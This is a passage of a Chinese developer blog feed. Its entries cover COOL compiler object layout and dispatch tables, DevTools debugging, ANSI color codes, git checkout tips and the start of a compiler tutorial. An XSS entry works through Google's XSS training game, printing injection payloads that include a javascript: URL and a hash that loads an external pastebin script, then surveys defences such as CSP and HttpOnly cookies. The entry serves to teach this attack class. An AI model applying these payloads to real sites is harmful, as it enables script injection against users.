<span class="hljs-selector-tag">a</span> - <span class="hljs-selector-tag">b</span> &#125;;<br>&#125;<br><br>class C &#123;<br>c: Int &lt;- <span class="hljs-number">3</span>;<br>h(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- <span class="hljs-selector-tag">a</span> * c &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>cool objects layout: (下面内存是连续的)</p><table><thead><tr class="header"><th style="text-align: center;">Class tag(int) 类标识符</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">Object size(int)</td></tr><tr class="even"><td style="text-align: center;">Dispatch ptr</td></tr><tr class="odd"><td style="text-align: center;">Attribute 1</td></tr><tr class="even"><td style="text-align: center;">Attribute 2</td></tr><tr class="odd"><td style="text-align: center;">...</td></tr></tbody></table><p>其中前3个称为header infomation</p><p>关于继承的子类的内存布局：考虑父类A，其子类B可以通过在A布局之上进行扩展得到，如下：</p><blockquote><p>B is an extension， just leaves the layout of A unchanged</p></blockquote><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th><th>8</th><th>12</th><th>16</th><th>20</th></tr></thead><tbody><tr class="odd"><td>A</td><td>Atag</td><td>5(word)</td><td>dispatch ptr1</td><td>a</td><td>d</td><td></td></tr><tr class="even"><td>B</td><td>Btag</td><td>6(word)</td><td>dispatch ptr2</td><td>a</td><td>d</td><td>b</td></tr><tr class="odd"><td>C</td><td>Ctag</td><td>6(word)</td><td>dispatch ptr3</td><td>a</td><td>d</td><td>c</td></tr></tbody></table><p>The offset for an attribute is the same in a class and all of itssubclass</p><p><strong>介绍下动态分配</strong></p><p>考虑e.f(), 这个表达式e生成之后，该如何调用对象上的方法呢？</p><p>和属性布局一样，对象的方法同样在内存上有着固定的偏移量(包含继承的方法)，只不过这些方法是存在一张dispatchtable里的(其实我个人喜欢称之为methodtable)，这张表提供了索引这些方法的能力，表里存储的是函数地址，如，方法f就是在其附属类的表里的固定偏移量处，当然在其子类也是同样的偏移量；</p><p>为什么同一方法在类和其子类中设计成固定的偏移量呢？wip</p><table><thead><tr class="header"><th>Class</th><th>0</th><th>4</th></tr></thead><tbody><tr class="odd"><td>A</td><td>fa</td><td></td></tr><tr class="even"><td>B</td><td>fb</td><td>g</td></tr><tr class="odd"><td>C</td><td>fa</td><td>h</td></tr></tbody></table><p>注：如果fa中海定义了其他方法，则可以</p><p>类的每个方法f都在编译期被分配在dispatch table的固定偏移量O_f处，换句话说，编译器的工作就是找出类的所有方法然后给每个方法分派一个固定的位置。</p><p>综上，为了实现dynamic dispatch<code>e.f()</code>，编译器应该走以下两个步骤：</p><ol type="1"><li>评估表达式e，得到一个对象x；</li><li>call <code>D[Of]</code><ul><li>D is the disptatch table for x</li><li>in the call ,self is bound to x</li></ul></li></ol><h2 id="总结">总结</h2><p>在学习完之后，我们考虑下如果是我们该如何为以下代码设计代码生成</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>a: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">1</span>;<br>f(): <span class="hljs-type">Int</span> &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">1</span>) &#125;;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>b: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">10</span>;<br>g(): int &#123; b;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>m: <span class="hljs-type">Int</span> &lt;- <span class="hljs-number">2</span>;<br>f(): int &#123; <span class="hljs-type">Int</span>(<span class="hljs-number">2</span>)&#125;;<br>&#125;<br><br>b: <span class="hljs-type">B</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>();<br>b.g();<br><br>c: <span class="hljs-type">C</span> &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">C</span>();<br>c.f();<br></code></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">评估b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new B();</span><br><span class="hljs-attribute">初始化</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table1</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">10</span><br><br><span class="hljs-attribute">dispath table1</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><span class="hljs-attribute">g</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__g</span><br><br><br><span class="hljs-attribute">评估c</span><span class="hljs-punctuation">:</span> <span class="hljs-string">A &lt;- new C();</span><br><span class="hljs-attribute">初始化c</span><br><span class="hljs-attribute">classTag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br><span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5</span><br><span class="hljs-attribute">0f4888 =&gt; dispath table2</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><span class="hljs-attribute">m</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br><br><br><span class="hljs-attribute">dispath table2</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">f</span><span class="hljs-punctuation">:</span> <span class="hljs-string">rcsv__f</span><br><br>b.g();<br>获取b对象的dispatch table1<br>拿到g方法<br>调用即可<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>debug</title>
    <link href="/emocoder/2023/05/07/debug/"/>
    <url>/emocoder/2023/05/07/debug/</url>
    
    <content type="html"><![CDATA[<h2 id="日志工具">日志工具</h2><p>开发者使用： trace：打印调用堆栈debug：不仅打印调用堆栈，还打印变量信息</p><p>用户使用： info warn：只是警告，但是不影响运行error：报错，但是不影响整个应用程序的继续运行 fatal:中断整个应用程序的执行</p><p>首先</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端，node，调试，debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacktech</title>
    <link href="/emocoder/2023/05/06/hacktech/"/>
    <url>/emocoder/2023/05/06/hacktech/</url>
    
    <content type="html"><![CDATA[<p>内网渗透+爆破：https://blog.csdn.net/m0_46684679/article/details/117854834</p><p>安全集锦：https://www.zhihu.com/column/c_1334810805263515648</p><p>网络防火墙：https://zhuanlan.zhihu.com/p/159088465</p><p>格式: echo -e "\033[字背景颜色;字体颜色m字符串\033[0m"</p><p>-e对特殊字符做转义</p><p>eg: echo -e "\033[41;36m something here \033[0m"</p><p>其中41的位置代表底色, 36的位置是代表字的颜色</p><p>正则通配符和linux通配符是不一样的，<em>（星号）是linux中的通配符，代表一个或一个以上的所有字符。linux的隐藏文件和隐藏文件夹都是以.（点号）开头，所以.</em>应该是代表当前目录下的所有隐藏目录和隐藏文件夹。如果是./*则表示当前目录下的所有文件和所有目录，因为.（点号）还有代表当前目录的意思</p><p>https://zhuanlan.zhihu.com/p/96272363，日志应该是最初开发的一部分其次，结束调试不要删除日志</p><p>写日志的地方： 关键方法调用：时间和调用参数 上下游对接处可能存在异常的地方</p><p>其他console方法： console.count: 用于计算函数被调用的次数console.log.countReset</p><p>console.group: 用于折叠 console.groupCollapsed() console.groupEnd</p><p>consoel.time() console.timeEnd()</p><p>console.table()</p><p>console.dir(obj, { depth: })</p><h2 id="chrome-devtools">Chrome Devtools</h2><p>Network: 查看，过滤网络请求列表，查看请求详情 模拟弱网环境搜索headers以及response内容 使用requeset block</p><p>Source 查看加载的资源文件 编辑css和js，修改css和js snippets管理断点调试 通过workspace关联到本地</p><ol type="1"><li><p>如何让source里的文件树看起来更清晰——查看author-deployed，但是项目必须有source-map</p></li><li><p>如何让call stack中仅出现关心的文件 ——debug ignore list在实际操作里，在stepin的过程中，如果遇到了一个不想调试的文件直接右击文件的代码区域，addignore list，下一次step in的时候就不会出现这个文件了，</p></li></ol><p>如何恢复？ ——顶级settings，找到ignore list</p><ol start="3" type="1"><li><p>如何对js的修改，reload之后还可以生效——overrides，选择本地目录添加到overrides中，</p></li><li><p>如何找出哪一行代码影响了我的元素 ——dom change breakponits比如找到哪一行删除了某个dom节点：右击某个dom节点——》break on-》noderemoval</p></li><li><p>如何找出哪一行代码发起了请求 ——source面板找到xhr/fetchbreakpoints，输入拦截的url即可</p></li><li><p>异常断点：source面板找到break points，勾选pause oncaught/uncaught points 捕获的or未捕获的</p></li><li><p>事件断点 全局事件：source面板找到event listener breakpoints，选择相应的事件即可</p></li><li><p>如何打断点，不会中断？ source 面板，某一行，右击选择edit breakpoints =》选择log points，输入想打印的语句即可</p></li></ol><p>字颜色:30-----------37 30:黑 31:红 32:绿 33:黄 34:蓝色 35:紫色36:深绿 37:白色</p><p>字背景颜色范围:40----47 40:黑 41:深红 42:绿 43:黄色 44:蓝色 45:紫色46:深绿 47:白色</p><p>字体加亮颜色:90------------97 90:黑 91:红 92:绿 93:黄 94:蓝色 95:紫色96:深绿 97:白色</p><p>背景加亮颜色范围:100--------------------107 40:黑 41:深红 42:绿43:黄色 44:蓝色 45:紫色 46:深绿 47:白色</p><p>===============================================ANSI控制码的说明\33[0m 关闭所有属性 \33[1m 设置高亮度 \33[4m 下划线 \33[5m 闪烁 \33[7m反显 \33[8m 消隐 \33[30m -- \33[37m 设置前景色 \33[40m -- \33[47m设置背景色 \33[nA 光标上移n行 \33[nB 光标下移n行 \33[nC 光标右移n行\33[nD 光标左移n行 \33[y;xH设置光标位置 \33[2J 清屏 \33[K清除从光标到行尾的内容 \33[s 保存光标位置 \33[u 恢复光标位置 \33[?25l隐藏光标 \33[?25h 显示光标</p><p>1b[2J1b[$;1H $表示行位</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透，爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXS</title>
    <link href="/emocoder/2023/05/05/xxs/"/>
    <url>/emocoder/2023/05/05/xxs/</url>
    
    <content type="html"><![CDATA[<p>XSS (Cross-sitescripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。</p><h2 id="xss-类型">XSS 类型</h2><p>XSS 大致可以分为 3 个类型</p><p>反射型 （Reflected XSS Attacks） 此种类型的跨站代码存在于 URL中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p><p>存储型（Stored XSS Attacks） 存储型 XSS 脚本攻击是指 Web应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型XSS 具有较强的稳定性。</p><p>DOM-based 型（DOM-based XSS Attacks） DOM-based的跨站脚本攻击是通过修改页面 DOM 节点数据信息而形成的跨站脚本攻击。</p><p>为了更加深切的近距离体验xss，可以登陆下https://xss-game.appspot.com/level3，这个游戏是 Google提供的一个 XSS的小游戏，大家可以自己在浏览器里试试看能不能闯过所有的关卡（可以通过研究Target Code 来找到可以注入代码的地方，如果想不出来可以看看页面上的Hints）。建议尽量不要看提示来挑战。这个游戏一共有 6关，每个关卡利用了各种不同的技巧和方式来插入恶意代码，有些方式确实非常取巧。</p><p>level1: 通过在 query 里拼接 script 元素，而前端代码又是会展示这个query 的，所以没有过滤的话，就直接运行脚本了，直接利用了 url插入脚本，属于反射型</p><p>level2: 用户提交 blog 或者评论，前端会展示这些评论或者 blog，虽然script 元素不会展示，但是像 dom 节点，如 a，img 元素还是会展示的，利用了dom，属于 dom 型，也可以理解为存储型，和存储相关。</p><p>level3:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">chooseTab</span>(<span class="hljs-params">num</span>) &#123;<br>  <span class="hljs-comment">// Dynamically load the appropriate image.</span><br>  <span class="hljs-keyword">var</span> html = <span class="hljs-string">&quot;Image &quot;</span> + <span class="hljs-built_in">parseInt</span>(num) + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>  html += <span class="hljs-string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="hljs-string">&quot;.jpg&#x27; /&gt;&quot;</span>;<br>  $(<span class="hljs-string">&quot;#tabContent&quot;</span>).<span class="hljs-title function_">html</span>(html);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用了在浏览器直接输入 url 的漏洞，前端代码会用 url 里的参数作为 img元素的属性直接拼接，由于没有对这些参数做转义，所以可能会导致恶意代码插入，由于利用了dom 元素，属于 dom 型</p><p>level4: 服务端模板包含如下代码：<img src="/static/loading.gif" onload="startTimer('');"/&gt;而timer是从url的参数里取的，如果这个timer包含了其他的js脚本代码，就会有问题，如下：https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvarb=('</p><p>=&gt; startTimer('');alert(1);var b=('');</p><p>level5: 前端脚本： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>前端直接利用url的参数拼接成了a元素的href属性：https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</p><p>level6: 服务端代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setInnerText</span>(<span class="hljs-params">element, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (element.<span class="hljs-property">innerText</span>) &#123;<br>    element.<span class="hljs-property">innerText</span> = value;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    element.<span class="hljs-property">textContent</span> = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">includeGadget</span>(<span class="hljs-params">url</span>) &#123;<br>  <span class="hljs-keyword">var</span> scriptEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br><br>  <span class="hljs-comment">// This will totally prevent us from loading evil URLs!</span><br>  <span class="hljs-keyword">if</span> (url.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^https?:\/\//</span>)) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&#x27;Sorry, cannot load a URL containing &quot;http&quot;.&#x27;</span><br>    );<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Load this awesome gadget</span><br>  scriptEl.<span class="hljs-property">src</span> = url;<br><br>  <span class="hljs-comment">// Show log messages</span><br>  scriptEl.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>), <span class="hljs-string">&quot;Loaded gadget from &quot;</span> + url);<br>  &#125;;<br>  scriptEl.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">setInnerText</span>(<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;log&quot;</span>),<br>      <span class="hljs-string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url<br>    );<br>  &#125;;<br><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(scriptEl);<br>&#125;<br><br><span class="hljs-comment">// Take the value after # and use it as the gadget filename.</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getGadgetName</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) || <span class="hljs-string">&quot;/static/gadget.js&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_">includeGadget</span>(<span class="hljs-title function_">getGadgetName</span>());<br></code></pre></td></tr></table></figure><p>这里本来想直接插入script元素的，但是行不通，只有通过script的src外链加载外域脚本：htTps://pastebin.com/raw.php?i=15S5qZs0https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</p><h2 id="更进一步地实验">更进一步地实验</h2><p>因为现在大部分的前后端框架都会有 XSS相关的安全策略，且默认是开启的，平时想要测试一下 XSS的漏洞可能还比较麻烦。针对这种情况，可以使用 Damn Vulnerable WebApplication（https://github.com/digininja/DVWA），它是一个主动关闭了各种安全策略的Web 应用，包括了各种各样漏洞，当然也包括 XSS的部分，可以用来测试自己对这些漏洞的掌握。</p><p>防范手段 防御 XSS一大原则就是不要信任用户输入的内容！所有用户输入的内容都可以默认为不可控的、不安全的，包括但不限于表单输入/URL 等可以由用户任意输入的来源。在回显用户的输入时候一定要做XSS 的过滤和相应的编码。</p><h2 id="浏览器内置的安全机制">浏览器内置的安全机制</h2><p>开启 X-XSS-Protection：针对反射型 XSS的一种浏览器防御机制，现在大部分现代浏览器已经废弃了这个属性。</p><p>内容安全策略 CSP：CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS 攻击所依赖的载体。一个 CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本(包括内联脚本和 HTML 的事件处理属性) 浏览器的同源策略。</p><p>Cookie 安全：设置 Cookie 的 HttpOnly 属性，能够最大限度的保证你的Cookie 不会被脚本所读取并发送到其他服务器上。</p><h2 id="使用成熟的框架安全机制">使用成熟的框架安全机制</h2><p>对于前端来说，使用常用的库，React/Vue/Angular等流行框架来渲染数据基本上都不会有太大的问题。需要注意的是，必须非常非常非常慎重使用类似React 的 dangerouslySetInnerHTML 或者 Vue 的 v-html 这类绕过 XSS过滤能力的属性。</p><p>不少后端服务的框架也都在设计时就考虑了 XSS 的安全问题，如 Ruby onRails。当然这类防御措施还是有其局限性的，并不是能一劳永逸的解决所有攻击威胁的。</p><h2id="在没有框架安全机制保证下需要避免的操作">在没有框架安全机制保证下需要避免的操作</h2><p>对于前端来说，主要需要针对处理的是 DOM-based 的 XSS 威胁。</p><p>在使用 Vanilla JavaScript 需要避免那些能够直接修改 HTML 的操作，如innerHTML/outerHTML 属性或者 document.write之类的方法。当需要展示文本的时候，选择如 textContent/innerText之类安全的方法。当需要创建 HTML 标签的时候，选择createElement/appendChild 之类的方法。</p><p>还有就是更加危险的 eval方法，虽然一般不会使用，但是需要避免一些隐式的 eval 使用，比如setTimeout/setInterval 就可以通过 setTimeout(codeAsString, delay)的形式执行任意字符串代码。</p><p>除此之外还有 HTML 标签上的一些事件属性等等。</p><p>如果无可避免的要使用类似方法，一定在渲染前做好过滤和编码工作。</p><h2 id="更加细致的防范-cheatsheet">更加细致的防范 CheatSheet</h2><p>开放式 Web 应用程序安全项目 （ OWASP）提供了针对 XSS 防御的详尽CheatSheet，感兴趣的同学可以作为参考。</p><p>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm</p><p>https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</p><h2 id="安全检测">安全检测</h2><p>一些工具可以扫描网站存在的 XSS 漏洞，可以方便查缺补漏</p><p>https://github.com/s0md3v/XSStrike</p><p>https://www.zaproxy.org/</p><h2 id="最后的最后">最后的最后</h2><p>需要注意，以上这些防御措施不能详尽描述每个细节和抵御所有 XSS攻击方式。针对 XSS的攻防战没有一劳永逸的银弹，也没有傻瓜式的解决方案。只有严格遵照安全最佳实践来尽量避免，并提升安全防范的意识，加强安全审计的工作。</p><p>钓鱼攻击： 主要是发生在提交的 HTMl内容的时候带有一些其他的域名地址，这些域名地址存在钓鱼的风险。 防范方式通过 securitykit.surl 方法进行校验，该方法对非白名单的地址进行剔除。</p><p>XSS防御方案最好是在编译时合运行时提供相关的预防方案：编译时预防开发人员出现存在安全漏洞的代码；运行时尽量不相信用户的任何输入</p><ul><li>运行时：提供运行时过滤API，能够过滤不在白名单上的标签以及常见的伪协议字符串。</li><li>编译时：提供 Babel 插件进行 AST 风险点识别，在风险点中包裹运行时过滤API，起到自动防御的能力。</li></ul><h2 id="参考文章">参考文章：</h2><p>https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端，xxs，跨站脚本攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git checkout 妙用</title>
    <link href="/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/"/>
    <url>/emocoder/2023/05/05/git-checkout-%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>当你在 Git中处理一个仓库时，你可能需要从另一个分支中获取（checkout）一个指定的文件。</p><p>幸运的是，Git提供了许多可能的方法来快速完成这项任务。其中一个最简单的解决方案是使用gitcheckout命令，将指定的文件作为一个参数。</p><p>在这篇文章中，我们将分析这个问题的不同解决方案，并介绍每一种解决方案所需要遵循的流程。</p><p>让我们开始吧。😎</p><p>Git Checkout 用例你正在处理一个名为feature/A的分支，其中包含一个名为utils.js的文件。</p><p>你有另一个名为feature/B的分支，里面有一个更新的utils.js文件。</p><p>你想签出该文件，并将其从feature/B分支带到feature/A分支。</p><p>下面是这个任务的三种可行的解决方案。</p><p>解决方案 1：使用 git checkout 命令 gitcheckout命令提供了一个简单的方法来从另一个分支获取文件或文件夹。</p><p>以下是从另一个分支获得（checkout）文件的语法：</p><p>git checkout <other-branch-name> -- path/to/your/folder以下是要遵循的流程：</p><ol type="1"><li>切换（checkout）到你想复制文件的那个分支。</li></ol><p>git checkout feature/A 2. 你在当前分支上，复制该文件。</p><p>git checkout feature/B -- utils.js 3. 使用gitstatus命令来确保文件已经被复制了。</p><ol start="4" type="1"><li>提交并推送到远程。</li></ol><p>在使用 checkout 命令时，你也可以得到：</p><p>一个来自另一个分支的文件夹。 通过指定每一个文件，可以指定多个文件另外，请注意，你可以从 stash 获得一个文件/文件夹。</p><p>解决方案 2：使用 git restore 命令 另一个选择是使用git switch命令和gitrestore命令。</p><p>如果你从未听说过这两个命令，那也没关系。它们是比较新的。Git 在 2019年的 2.23 版本中引入了它们。</p><p>这两个命令的目的是减少使用 git checkout命令，以简化用户的工作。</p><p>git restore命令可以恢复工作树。</p><p>git switch命令切换分支。</p><p>下面是从另一个分支获取文件的过程：</p><ol type="1"><li>切换到你想获取（checkout）文件的分支。</li></ol><p>git switch feature/A 2. 从另一个分支获取文件。</p><p>git restore --source feature/B -- utils.js 3. 提交并推送更改。</p><p>解决方案 3：使用 git show 命令 最后，我们可以使用git show命令。</p><p>以下是要遵循的流程：</p><ol type="1"><li>切换到工作分支。</li></ol><p>git switch feature/A 2. 从另一个分支获取文件。</p><p>git show feature/B:path/utils.js &gt; path/utils.js 3.提交并推送更改。</p><p>注意: 这次你需要指定来自你的目录根的相对路径。</p><p>小结正如你所看到的，从另一个分支获取一个文件并不是什么像发射火箭那样困难。</p><p>当我在日常生活中需要这样做时，我通常使用git checkout命令。</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node从头手写一个简单编译器</title>
    <link href="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    <url>/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>使用语言：node本文涉及：编译器的词法分析，抽象语义树生成，语法分析，代码生成本文重点内容：</p><ol type="1"><li>实现正则表达式分析器</li><li>实现简易版 Flex</li><li>实现 LR0 语法，并简单介绍其他语法(LL, LR1, SLR, LSPR)</li><li>实现简易版 Bison</li><li>实现生成汇编代码</li><li>实现简易编译器功能，提供编译时期类型检查和推断，支持加减乘除支持函数的递归调用，以及</li></ol><p>会包含的：</p><ol type="1"><li>实现 nfa，以及联合 nfa =&gt; dfa，进行词法分析</li><li>实现 dfa，进行语法分析，并基于此构建抽象语法树(AST)</li><li>基于 ast 进行语言义分析(类型检查以及是否符合语言规范)</li><li>基于 ast生成汇编代码，虽然本文没有显示的终中间代码生成过程，但是也有类似的思想</li></ol><p>不会包含的：本语言比较简单，不包含复杂数据结构的支持，如数组对象等其他功能；不会涉及复杂的编译器后端知识：如垃圾回收，寄存器染色，数据流分析等等</p><p>minic 语法：</p><ol type="1"><li>运算符：支持+-*/运算，不支持优先级(, )</li><li>类型：支持自然数(int 类型)，字符串，布尔值以及 void</li><li>语句：支持函数调用，嵌套的 if-else语句（if-else必须成对出现，如下的语法是不允许的）</li><li>和 C 一样，必须要有 main 函数</li><li>变量必须声明的时候同时赋值，如下的声明是不允许的</li><li>允许块级作用域</li><li>允许返回值是条件表达式，运算表达式</li><li>运算符左右两侧仅可以是变量或是数字</li></ol><p>结果示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span 